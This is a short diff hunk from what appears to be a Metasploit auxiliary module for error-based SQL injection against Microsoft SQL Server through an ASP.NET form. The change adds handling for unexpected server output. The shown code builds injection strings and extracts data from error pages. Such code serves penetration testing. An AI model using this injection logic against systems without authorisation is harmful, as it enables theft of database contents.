@@ -136,7 +136,9 @@ class MetasploitModule < Msf::Auxiliary
     sqli = create_sqli(dbms: Msf::Exploit::SQLi::Mssqli::Common, opts: { safe: true, encoder: { encode: "'#{header}'+^DATA^+'#{footer}'", decode: ->(x) { x[/#{header}(.+?)#{footer}/mi, 1] } } }) do |payload|
       int = Rex::Text.rand_text_numeric(4)
       res = inject("'+(select '' where #{int} in (#{payload}))+'", viewstate, viewstategenerator, eventvalidation)
-      error_info(res)[/\\u0027(.+?)\\u0027/m, 1]
+      err_info = error_info(res)
+      print_error('Unexpected output from the server') if err_info.nil?
+      err_info[/\\u0027(.+?)\\u0027/m, 1]
     end
 
     # all inject strings taken from sqlmap runs, using error page method
